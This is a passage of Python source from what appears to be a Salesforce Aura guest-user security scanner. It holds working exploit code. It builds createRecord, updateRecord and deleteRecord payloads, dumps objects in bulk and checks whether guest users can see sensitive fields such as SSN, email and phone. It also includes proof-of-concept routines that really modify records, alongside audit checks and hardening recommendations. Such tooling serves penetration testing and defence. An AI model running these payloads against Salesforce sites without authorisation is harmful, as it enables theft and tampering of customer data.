                        "message": "Guest user cannot CREATE {} records".format(object_name),
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "message": "Guest user cannot CREATE {} records".format(object_name),
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "message": "Guest user cannot CREATE {} records".format(object_name),
                "error": str(e)
            }

    def test_update_permission(self, endpoint: str, aura_context: str, object_name: str) -> Dict:
        """Test if guest user can update records"""
        try:
            # First try to get a record ID
            records = self.dump_object(endpoint, aura_context, object_name, page_size=1, page=1)
            if not records or not records.get('actions', [{}])[0].get('returnValue', {}).get('result'):
                return {
                    "success": False,
                    "message": "No {} records found to test UPDATE".format(object_name)
                }
            
            record_id = records['actions'][0]['returnValue']['result'][0]['record']['Id']
            
            # Create update payload
            update_data = self.generate_test_update_data(object_name)
            payload = self.create_payload_for_update_record(object_name, record_id, update_data)
            
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    return {
                        "success": True,
                        "message": "Guest user can UPDATE {} records".format(object_name),
                        "record_id": record_id,
                        "update_data": update_data,
                        "response": response
                    }
                else:
                    return {
                        "success": False,
                        "message": "Guest user cannot UPDATE {} records".format(object_name),
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "message": "Guest user cannot UPDATE {} records".format(object_name),
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "message": "Guest user cannot UPDATE {} records".format(object_name),
                "error": str(e)
            }

    def test_delete_permission(self, endpoint: str, aura_context: str, object_name: str) -> Dict:
        """Test if guest user can delete records"""
        try:
            # First try to get a record ID
            records = self.dump_object(endpoint, aura_context, object_name, page_size=1, page=1)
            if not records or not records.get('actions', [{}])[0].get('returnValue', {}).get('result'):
                return {
                    "success": False,
                    "message": "No {} records found to test DELETE".format(object_name)
                }
            
            record_id = records['actions'][0]['returnValue']['result'][0]['record']['Id']
            
            # Create delete payload
            payload = self.create_payload_for_delete_record(object_name, record_id)
            
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    return {
                        "success": True,
                        "message": "Guest user can DELETE {} records".format(object_name),
                        "record_id": record_id,
                        "response": response
                    }
                else:
                    return {
                        "success": False,
                        "message": "Guest user cannot DELETE {} records".format(object_name),
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "message": "Guest user cannot DELETE {} records".format(object_name),
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "message": "Guest user cannot DELETE {} records".format(object_name),
                "error": str(e)
            }

    def test_field_write_permissions(self, endpoint: str, aura_context: str, object_name: str) -> Dict:
        """Test which fields guest users can write to"""
        try:
            # Get field permissions
            payload = ADVANCED_PAYLOADS.get('get_field_permissions_write', '').replace('User', object_name)
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    field_data = actions[0].get('returnValue', {})
                    writable_fields = []
                    
                    # Parse field permissions
                    for field in field_data.get('fields', []):
                        if field.get('permissions', {}).get('editable'):
                            writable_fields.append({
                                "name": field.get('name'),
                                "type": field.get('type'),
                                "label": field.get('label')
                            })
                    
                    return {
                        "success": True,
                        "writable_fields": writable_fields,
                        "total_writable": len(writable_fields)
                    }
                else:
                    return {
                        "success": False,
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def generate_test_record_data(self, object_name: str) -> Dict:
        """Generate test data for creating records"""
        test_data = {}
        
        if object_name == 'User':
            test_data = {
                "FirstName": "Test",
                "LastName": "GuestUser",
                "Email": "testguest@example.com",
                "Username": "testguest@example.com.test"
            }
        elif object_name == 'Account':
            test_data = {
                "Name": "Test Account - Guest User"
            }
        elif object_name == 'Contact':
            test_data = {
                "FirstName": "Test",
                "LastName": "Contact",
                "Email": "testcontact@example.com"
            }
        elif object_name == 'Lead':
            test_data = {
                "FirstName": "Test",
                "LastName": "Lead",
                "Email": "testlead@example.com",
                "Company": "Test Company"
            }
        elif object_name == 'Case':
            test_data = {
                "Subject": "Test Case - Guest User",
                "Description": "This is a test case created by guest user"
            }
        elif object_name == 'Task':
            test_data = {
                "Subject": "Test Task - Guest User",
                "Status": "Not Started"
            }
        elif object_name == 'Event':
            test_data = {
                "Subject": "Test Event - Guest User",
                "StartDateTime": "2024-12-31T10:00:00.000Z",
                "EndDateTime": "2024-12-31T11:00:00.000Z"
            }
        elif object_name == 'Note':
            test_data = {
                "Title": "Test Note - Guest User",
                "Body": "This is a test note created by guest user"
            }
        else:
            test_data = {
                "Name": "Test {} - Guest User".format(object_name)
            }
        
        return test_data

    def generate_test_update_data(self, object_name: str) -> Dict:
        """Generate test data for updating records"""
        if object_name == 'User':
            return {"FirstName": "UpdatedTest"}
        elif object_name == 'Account':
            return {"Name": "Updated Test Account"}
        elif object_name == 'Contact':
            return {"FirstName": "UpdatedTest"}
        elif object_name == 'Lead':
            return {"Company": "Updated Test Company"}
        elif object_name == 'Case':
            return {"Subject": "Updated Test Case"}
        elif object_name == 'Task':
            return {"Subject": "Updated Test Task"}
        elif object_name == 'Event':
            return {"Subject": "Updated Test Event"}
        elif object_name == 'Note':
            return {"Title": "Updated Test Note"}
        else:
            return {"Name": "Updated Test {}".format(object_name)}

    def create_payload_for_create_record(self, object_name: str, data: Dict) -> str:
        """Create payload for creating a record"""
        data_json = json.dumps(data).replace('"', '\\"')
        return f'{{"actions":[{{"id":"createRecord","descriptor":"serviceComponent://ui.force.components.controllers.record.RecordController/ACTION$createRecord","callingDescriptor":"UNKNOWN","params":{{"objectName":"{object_name}","recordData":{data_json}}}}}]}}'

    def create_payload_for_update_record(self, object_name: str, record_id: str, data: Dict) -> str:
        """Create payload for updating a record"""
        data_json = json.dumps(data).replace('"', '\\"')
        return f'{{"actions":[{{"id":"updateRecord","descriptor":"serviceComponent://ui.force.components.controllers.record.RecordController/ACTION$updateRecord","callingDescriptor":"UNKNOWN","params":{{"objectName":"{object_name}","recordId":"{record_id}","recordData":{data_json}}}}}]}}'

    def create_payload_for_delete_record(self, object_name: str, record_id: str) -> str:
        """Create payload for deleting a record"""
        return f'{{"actions":[{{"id":"deleteRecord","descriptor":"serviceComponent://ui.force.components.controllers.record.RecordController/ACTION$deleteRecord","callingDescriptor":"UNKNOWN","params":{{"objectName":"{object_name}","recordId":"{record_id}"}}}}]}}'

    def perform_data_exfiltration_test(self, endpoint: str, aura_context: str) -> Dict:
        """Test data exfiltration capabilities"""
        logger.info("Performing data exfiltration tests")
        exfiltration_results = {
            "bulk_data_access": {},
            "sensitive_data_exposure": {},
            "api_access": {},
            "file_download": {},
            "email_extraction": {}
        }
        
        # Test bulk data access
        try:
            bulk_result = self.test_bulk_data_access(endpoint, aura_context)
            exfiltration_results["bulk_data_access"] = bulk_result
        except Exception as e:
            logger.warning("Bulk data access test failed: {}".format(e))
        
        # Test sensitive data exposure
        try:
            sensitive_result = self.test_sensitive_data_exposure(endpoint, aura_context)
            exfiltration_results["sensitive_data_exposure"] = sensitive_result
        except Exception as e:
            logger.warning("Sensitive data exposure test failed: {}".format(e))
        
        # Test API access
        try:
            api_result = self.test_api_access(endpoint, aura_context)
            exfiltration_results["api_access"] = api_result
        except Exception as e:
            logger.warning("API access test failed: {}".format(e))
        
        return exfiltration_results

    def test_bulk_data_access(self, endpoint: str, aura_context: str) -> Dict:
        """Test if guest user can access large amounts of data"""
        bulk_results = {
            "html_response_count": 0,
            "protected_objects": [],
            "accessible_objects": []
        }
        
        # Test large page sizes
        for page_size in [1000, 2000, 5000]:
            try:
                response = self.dump_object(endpoint, aura_context, 'User', page_size=page_size, page=1)
                
                # Check for HTML response
                if response and response.get('exceptionEvent') == 'HTML_RESPONSE':
                    bulk_results["html_response_count"] += 1
                    bulk_results[f"page_size_{page_size}"] = {
                        "success": False,
                        "error": "HTML_RESPONSE",
                        "message": "Object access requires authentication"
                    }
                    continue
                
                if response and response.get('actions', [{}])[0].get('state') == 'SUCCESS':
                    record_count = len(response['actions'][0]['returnValue'].get('result', []))
                    bulk_results[f"page_size_{page_size}"] = {
                        "success": True,
                        "records_retrieved": record_count,
                        "total_available": response['actions'][0]['returnValue'].get('totalCount', 0)
                    }
                else:
                    bulk_results[f"page_size_{page_size}"] = {
                        "success": False,
                        "error": "Access denied or failed"
                    }
            except Exception as e:
                bulk_results[f"page_size_{page_size}"] = {
                    "success": False,
                    "error": str(e)
                }
        
        # Test multiple objects
        sensitive_objects = ['User', 'Account', 'Contact', 'Lead', 'Case']
        for obj_name in sensitive_objects:
            try:
                response = self.dump_object(endpoint, aura_context, obj_name)
                
                # Check for HTML response
                if response and response.get('exceptionEvent') == 'HTML_RESPONSE':
                    bulk_results["html_response_count"] += 1
                    bulk_results["protected_objects"].append(obj_name)
                    bulk_results[f"object_{obj_name}"] = {
                        "success": False,
                        "error": "HTML_RESPONSE",
                        "message": "Object access requires authentication"
                    }
                    continue
                
                if response and response.get('actions', [{}])[0].get('state') == 'SUCCESS':
                    record_count = len(response['actions'][0]['returnValue'].get('result', []))
                    bulk_results["accessible_objects"].append(obj_name)
                    bulk_results[f"object_{obj_name}"] = {
                        "success": True,
                        "records_retrieved": record_count,
                        "total_available": response['actions'][0]['returnValue'].get('totalCount', 0)
                    }
                else:
                    bulk_results[f"object_{obj_name}"] = {
                        "success": False,
                        "error": "Access denied or failed"
                    }
            except Exception as e:
                bulk_results[f"object_{obj_name}"] = {
                    "success": False,
                    "error": str(e)
                }
        
        return bulk_results

    def test_sensitive_data_exposure(self, endpoint: str, aura_context: str) -> Dict:
        """Test exposure of sensitive data fields"""
        sensitive_fields = {
            'User': ['Email', 'Phone', 'MobilePhone', 'SSN__c', 'Social_Security_Number__c'],
            'Account': ['BillingStreet', 'BillingCity', 'BillingPostalCode', 'Phone', 'Website'],
            'Contact': ['Email', 'Phone', 'MobilePhone', 'MailingStreet', 'MailingCity'],
            'Lead': ['Email', 'Phone', 'MobilePhone', 'Street', 'City', 'PostalCode']
        }
        
        exposure_results = {}
        
        for object_name, fields in sensitive_fields.items():
            try:
                response = self.dump_object(endpoint, aura_context, object_name, page_size=10, page=1)
                if response and response.get('actions', [{}])[0].get('state') == 'SUCCESS':
                    records = response['actions'][0]['returnValue'].get('result', [])
                    exposed_fields = []
                    
                    for record in records:
                        record_data = record.get('record', {})
                        for field in fields:
                            if field in record_data and record_data[field]:
                                exposed_fields.append(field)
                    
                    exposure_results[object_name] = {
                        "success": True,
                        "exposed_fields": list(set(exposed_fields)),
                        "record_count": len(records)
                    }
                else:
                    exposure_results[object_name] = {
                        "success": False,
                        "error": "Access denied"
                    }
            except Exception as e:
                exposure_results[object_name] = {
                    "success": False,
                    "error": str(e)
                }
        
        return exposure_results

    def test_api_access(self, endpoint: str, aura_context: str) -> Dict:
        """Test API access capabilities"""
        api_tests = {
            "soql_query": self.test_soql_query_access(endpoint, aura_context),
            "describe_objects": self.test_describe_access(endpoint, aura_context),
            "metadata_api": self.test_metadata_api_access(endpoint, aura_context)
        }
        
        return api_tests

    def perform_guest_user_security_audit(self, endpoint: str, aura_context: str) -> Dict:
        """Perform comprehensive guest user security audit based on Salesforce best practices"""
        logger.info("Performing comprehensive guest user security audit")
        audit_results = {
            "guest_user_profile": {},
            "sharing_settings": {},
            "guest_policies": {},
            "public_access_settings": {},
            "lightning_components_guest": {},
            "apex_classes_guest": {},
            "flows_guest": {},
            "api_access_guest": {},
            "system_context_access": {},
            "guest_user_limits": {},
            "community_member_access": {},
            "public_group_membership": {},
            "guest_user_sharing_rules": {},
            "security_violations": [],
            "recommendations": []
        }
        
        # Test guest user profile and permissions
        try:
            guest_profile = self.test_guest_user_profile(endpoint, aura_context)
            audit_results["guest_user_profile"] = guest_profile
            if guest_profile.get("dangerous_permissions"):
                audit_results["security_violations"].extend(guest_profile["dangerous_permissions"])
        except Exception as e:
            logger.warning("Guest user profile test failed: {}".format(e))
        
        # Test sharing settings
        try:
            sharing_settings = self.test_sharing_settings(endpoint, aura_context)
            audit_results["sharing_settings"] = sharing_settings
            if sharing_settings.get("security_issues"):
                audit_results["security_violations"].extend(sharing_settings["security_issues"])
        except Exception as e:
            logger.warning("Sharing settings test failed: {}".format(e))
        
        # Test guest policies
        try:
            guest_policies = self.test_guest_policies(endpoint, aura_context)
            audit_results["guest_policies"] = guest_policies
            if guest_policies.get("policy_violations"):
                audit_results["security_violations"].extend(guest_policies["policy_violations"])
        except Exception as e:
            logger.warning("Guest policies test failed: {}".format(e))
        
        # Test public access settings
        try:
            public_access = self.test_public_access_settings(endpoint, aura_context)
            audit_results["public_access_settings"] = public_access
            if public_access.get("access_violations"):
                audit_results["security_violations"].extend(public_access["access_violations"])
        except Exception as e:
            logger.warning("Public access settings test failed: {}".format(e))
        
        # Test Lightning components with guest access
        try:
            lightning_guest = self.test_lightning_components_guest_access(endpoint, aura_context)
            audit_results["lightning_components_guest"] = lightning_guest
            if lightning_guest.get("exposed_components"):
                audit_results["security_violations"].extend(lightning_guest["exposed_components"])
        except Exception as e:
            logger.warning("Lightning components guest access test failed: {}".format(e))
        
        # Test Apex classes with guest access
        try:
            apex_guest = self.test_apex_classes_guest_access(endpoint, aura_context)
            audit_results["apex_classes_guest"] = apex_guest
            if apex_guest.get("exposed_classes"):
                audit_results["security_violations"].extend(apex_guest["exposed_classes"])
        except Exception as e:
            logger.warning("Apex classes guest access test failed: {}".format(e))
        
        # Test API access for guest users
        try:
            api_guest = self.test_api_access_guest(endpoint, aura_context)
            audit_results["api_access_guest"] = api_guest
            if api_guest.get("api_violations"):
                audit_results["security_violations"].extend(api_guest["api_violations"])
        except Exception as e:
            logger.warning("API access guest test failed: {}".format(e))
        
        # Test system context access
        try:
            system_context = self.test_system_context_access(endpoint, aura_context)
            audit_results["system_context_access"] = system_context
            if system_context.get("context_violations"):
                audit_results["security_violations"].extend(system_context["context_violations"])
        except Exception as e:
            logger.warning("System context access test failed: {}".format(e))
        
        # Generate security recommendations
        audit_results["recommendations"] = self.generate_guest_user_security_recommendations(audit_results)
        
        return audit_results

    def test_guest_user_profile(self, endpoint: str, aura_context: str) -> Dict:
        """Test guest user profile and identify dangerous permissions"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_guest_user_profile', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    profile_data = actions[0].get('returnValue', {})
                    dangerous_permissions = []
                    
                    # Check for dangerous permissions
                    permissions = profile_data.get('permissions', [])
                    for permission in permissions:
                        if permission in ['ViewAllData', 'ModifyAllData', 'ViewAllUsers', 'ModifyAllUsers', 
                                        'APIEnabled', 'BulkApiHardDelete', 'BulkApiDelete', 'BulkApiUpdate']:
                            dangerous_permissions.append(f"DANGEROUS: Guest user has {permission} permission")
                    
                    # Check for object permissions
                    object_permissions = profile_data.get('objectPermissions', {})
                    for obj, perms in object_permissions.items():
                        if perms.get('create') and obj in ['User', 'Account', 'Contact', 'Lead']:
                            dangerous_permissions.append(f"DANGEROUS: Guest user can CREATE {obj} records")
                        if perms.get('delete') and obj in ['User', 'Account', 'Contact', 'Lead']:
                            dangerous_permissions.append(f"DANGEROUS: Guest user can DELETE {obj} records")
                    
                    return {
                        "success": True,
                        "profile_data": profile_data,
                        "dangerous_permissions": dangerous_permissions,
                        "total_permissions": len(permissions),
                        "object_permissions": len(object_permissions)
                    }
                else:
                    return {
                        "success": False,
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def test_sharing_settings(self, endpoint: str, aura_context: str) -> Dict:
        """Test sharing settings for security issues"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_sharing_settings', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    sharing_data = actions[0].get('returnValue', {})
                    security_issues = []
                    
                    # Check for overly permissive sharing rules
                    sharing_rules = sharing_data.get('sharingRules', [])
                    for rule in sharing_rules:
                        if rule.get('accessLevel') == 'All' and rule.get('objectType') in ['User', 'Account', 'Contact']:
                            security_issues.append(f"SECURITY ISSUE: Overly permissive sharing rule for {rule.get('objectType')}")
                    
                    # Check for public group access
                    public_groups = sharing_data.get('publicGroups', [])
                    if public_groups:
                        security_issues.append(f"SECURITY ISSUE: {len(public_groups)} public groups accessible")
                    
                    return {
                        "success": True,
                        "sharing_data": sharing_data,
                        "security_issues": security_issues,
                        "sharing_rules_count": len(sharing_rules),
                        "public_groups_count": len(public_groups)
                    }
                else:
                    return {
                        "success": False,
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def test_guest_policies(self, endpoint: str, aura_context: str) -> Dict:
        """Test guest user policies for violations"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_guest_policies', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    policies_data = actions[0].get('returnValue', {})
                    policy_violations = []
                    
                    # Check for policy violations
                    policies = policies_data.get('policies', [])
                    for policy in policies:
                        if policy.get('name') == 'Guest User Policy' and policy.get('enabled'):
                            if not policy.get('secureGuestUserRecordAccess'):
                                policy_violations.append("POLICY VIOLATION: Secure guest user record access not enabled")
                            if policy.get('allowGuestUserApiAccess'):
                                policy_violations.append("POLICY VIOLATION: Guest user API access is enabled")
                    
                    return {
                        "success": True,
                        "policies_data": policies_data,
                        "policy_violations": policy_violations,
                        "policies_count": len(policies)
                    }
                else:
                    return {
                        "success": False,
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def test_public_access_settings(self, endpoint: str, aura_context: str) -> Dict:
        """Test public access settings for security issues"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_public_access_settings', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    access_data = actions[0].get('returnValue', {})
                    access_violations = []
                    
                    # Check for public access violations
                    if access_data.get('publicAccessEnabled'):
                        access_violations.append("ACCESS VIOLATION: Public access is enabled")
                    
                    if access_data.get('allowGuestUserRegistration'):
                        access_violations.append("ACCESS VIOLATION: Guest user registration is allowed")
                    
                    if access_data.get('allowGuestUserLogin'):
                        access_violations.append("ACCESS VIOLATION: Guest user login is allowed")
                    
                    return {
                        "success": True,
                        "access_data": access_data,
                        "access_violations": access_violations
                    }
                else:
                    return {
                        "success": False,
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def test_lightning_components_guest_access(self, endpoint: str, aura_context: str) -> Dict:
        """Test Lightning components with guest access"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_lightning_components_guest', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    components_data = actions[0].get('returnValue', {})
                    exposed_components = []
                    
                    # Check for exposed Lightning components
                    components = components_data.get('components', [])
                    for component in components:
                        if component.get('guestAccess') and component.get('auraEnabled'):
                            exposed_components.append(f"EXPOSED: Lightning component {component.get('name')} has guest access")
                    
                    return {
                        "success": True,
                        "components_data": components_data,
                        "exposed_components": exposed_components,
                        "total_components": len(components),
                        "guest_accessible_components": len([c for c in components if c.get('guestAccess')])
                    }
                else:
                    return {
                        "success": False,
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def test_apex_classes_guest_access(self, endpoint: str, aura_context: str) -> Dict:
        """Test Apex classes with guest access"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_apex_classes_guest', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    classes_data = actions[0].get('returnValue', {})
                    exposed_classes = []
                    
                    # Check for exposed Apex classes
                    classes = classes_data.get('classes', [])
                    for cls in classes:
                        if cls.get('guestAccess') and cls.get('auraEnabled'):
                            exposed_classes.append(f"EXPOSED: Apex class {cls.get('name')} has guest access")
                    
                    return {
                        "success": True,
                        "classes_data": classes_data,
                        "exposed_classes": exposed_classes,
                        "total_classes": len(classes),
                        "guest_accessible_classes": len([c for c in classes if c.get('guestAccess')])
                    }
                else:
                    return {
                        "success": False,
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def test_api_access_guest(self, endpoint: str, aura_context: str) -> Dict:
        """Test API access for guest users"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_api_access_guest', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    api_data = actions[0].get('returnValue', {})
                    api_violations = []
                    
                    # Check for API access violations
                    if api_data.get('apiEnabled'):
                        api_violations.append("API VIOLATION: Guest user has API access enabled")
                    
                    if api_data.get('bulkApiAccess'):
                        api_violations.append("API VIOLATION: Guest user has Bulk API access")
                    
                    if api_data.get('restApiAccess'):
                        api_violations.append("API VIOLATION: Guest user has REST API access")
                    
                    return {
                        "success": True,
                        "api_data": api_data,
                        "api_violations": api_violations
                    }
                else:
                    return {
                        "success": False,
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def test_system_context_access(self, endpoint: str, aura_context: str) -> Dict:
        """Test system context access"""
        try:
            payload = ADVANCED_PAYLOADS.get('get_system_context_access', '')
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    context_data = actions[0].get('returnValue', {})
                    context_violations = []
                    
                    # Check for system context violations
                    if context_data.get('systemContextEnabled'):
                        context_violations.append("CONTEXT VIOLATION: System context access is enabled for guest users")
                    
                    if context_data.get('bypassSecurityChecks'):
                        context_violations.append("CONTEXT VIOLATION: Security checks are bypassed")
                    
                    return {
                        "success": True,
                        "context_data": context_data,
                        "context_violations": context_violations
                    }
                else:
                    return {
                        "success": False,
                        "error": actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    }
            else:
                return {
                    "success": False,
                    "error": response.get('exceptionEvent', 'Unknown error')
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def generate_guest_user_security_recommendations(self, audit_results: Dict) -> List[str]:
        """Generate security recommendations based on audit results"""
        recommendations = []
        
        # Check for dangerous permissions
        if audit_results.get("guest_user_profile", {}).get("dangerous_permissions"):
            recommendations.extend([
                "Remove dangerous permissions from guest user profile",
                "Disable 'View All Data' and 'Modify All Data' permissions",
                "Disable 'API Enabled' permission for guest users",
                "Review and restrict object-level permissions"
            ])
        
        # Check for sharing issues
        if audit_results.get("sharing_settings", {}).get("security_issues"):
            recommendations.extend([
                "Review and restrict sharing rules",
                "Remove overly permissive sharing rules",
                "Limit public group access",
                "Enable 'Secure guest user record access'"
            ])
        
        # Check for policy violations
        if audit_results.get("guest_policies", {}).get("policy_violations"):
            recommendations.extend([
                "Enable secure guest user record access",
                "Disable guest user API access",
                "Implement proper guest user policies",
                "Regularly audit guest user permissions"
            ])
        
        # Check for exposed components
        if audit_results.get("lightning_components_guest", {}).get("exposed_components"):
            recommendations.extend([
                "Review Lightning components with guest access",
                "Remove unnecessary guest access from components",
                "Implement proper component security",
                "Use @AuraEnabled(cacheable=true) for read-only operations"
            ])
        
        # Check for API violations
        if audit_results.get("api_access_guest", {}).get("api_violations"):
            recommendations.extend([
                "Disable API access for guest users",
                "Remove Bulk API access",
                "Restrict REST API access",
                "Implement API rate limiting"
            ])
        
        # General recommendations
        recommendations.extend([
            "Regularly audit guest user permissions and access",
            "Implement principle of least privilege",
            "Monitor guest user activities",
            "Enable audit trails for guest user actions",
            "Review and update guest user policies regularly"
        ])
        
        return list(set(recommendations))  # Remove duplicates

    def perform_create_poc(self, endpoint: str, aura_context: str, object_name: str) -> Dict:
        """Perform Proof of Concept for CREATE permission testing"""
        logger.info("🔍 Performing CREATE PoC for: {}".format(object_name))
        
        poc_result = {
            "exploitable": False,
            "payload": "",
            "response": "",
            "evidence": {},
            "summary": "",
            "risk_level": "LOW"
        }
        
        try:
            # Generate test data based on object type
            test_data = self.generate_test_record_data(object_name)
            payload = self.create_payload_for_create_record(object_name, test_data)
            poc_result["payload"] = payload
            
            logger.info("📤 Sending CREATE PoC payload for: {}".format(object_name))
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            poc_result["response"] = str(response)
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    poc_result["exploitable"] = True
                    poc_result["risk_level"] = "CRITICAL"
                    poc_result["summary"] = "Successfully created {} record as guest user".format(object_name)
                    poc_result["evidence"] = {
                        "created_record_id": actions[0].get('returnValue', {}).get('id', 'Unknown'),
                        "response_data": actions[0].get('returnValue', {}),
                        "timestamp": datetime.now().isoformat()
                    }
                    logger.info("🚨 CREATE PoC SUCCESS: {} record created!".format(object_name))
                else:
                    error_msg = actions[0].get('error', 'Unknown error') if actions else 'No actions'
                    poc_result["summary"] = "CREATE failed: {}".format(error_msg)
                    logger.info("❌ CREATE PoC FAILED: {}".format(error_msg))
            else:
                poc_result["summary"] = "CREATE failed: {}".format(response.get('exceptionEvent', 'Unknown error'))
                logger.info("❌ CREATE PoC FAILED: {}".format(poc_result["summary"]))
                
        except Exception as e:
            poc_result["summary"] = "CREATE PoC error: {}".format(str(e))
            logger.error("CREATE PoC error for {}: {}".format(object_name, e))
        
        return poc_result

    def perform_update_poc(self, endpoint: str, aura_context: str, object_name: str) -> Dict:
        """Perform Proof of Concept for UPDATE permission testing"""
        logger.info("🔍 Performing UPDATE PoC for: {}".format(object_name))
        
        poc_result = {
            "exploitable": False,
            "payload": "",
            "response": "",
            "evidence": {},
            "summary": "",
            "risk_level": "LOW"
        }
        
        try:
            # First, try to get an existing record to update
            list_payload = self.create_payload_for_getItems(object_name, 1, 1)
            list_response = self.exploit_aura_endpoint(endpoint, list_payload, aura_context)
            
            if list_response and not list_response.get('exceptionEvent'):
                actions = list_response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    records = actions[0].get('returnValue', {}).get('records', [])
                    if records:
                        record_id = records[0].get('Id')
                        if record_id:
                            # Generate update data
                            update_data = self.generate_test_update_data(object_name)
                            payload = self.create_payload_for_update_record(object_name, record_id, update_data)
                            poc_result["payload"] = payload
                            
                            logger.info("📤 Sending UPDATE PoC payload for: {} (ID: {})".format(object_name, record_id))
                            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
                            poc_result["response"] = str(response)
                            
                            if response and not response.get('exceptionEvent'):
                                actions = response.get('actions', [])
                                if actions and actions[0].get('state') == 'SUCCESS':
                                    poc_result["exploitable"] = True
                                    poc_result["risk_level"] = "CRITICAL"
                                    poc_result["summary"] = "Successfully updated {} record as guest user".format(object_name)
                                    poc_result["evidence"] = {
                                        "updated_record_id": record_id,
                                        "response_data": actions[0].get('returnValue', {}),
                                        "timestamp": datetime.now().isoformat()
                                    }
                                    logger.info("🚨 UPDATE PoC SUCCESS: {} record updated!".format(object_name))
                                else:
                                    error_msg = actions[0].get('error', 'Unknown error') if actions else 'No actions'
                                    poc_result["summary"] = "UPDATE failed: {}".format(error_msg)
                                    logger.info("❌ UPDATE PoC FAILED: {}".format(error_msg))
                            else:
                                poc_result["summary"] = "UPDATE failed: {}".format(response.get('exceptionEvent', 'Unknown error'))
                                logger.info("❌ UPDATE PoC FAILED: {}".format(poc_result["summary"]))
                        else:
                            poc_result["summary"] = "No record ID found for UPDATE test"
                    else:
                        poc_result["summary"] = "No records found for UPDATE test"
                else:
                    poc_result["summary"] = "Failed to list records for UPDATE test"
            else:
                poc_result["summary"] = "Failed to list records for UPDATE test"
                
        except Exception as e:
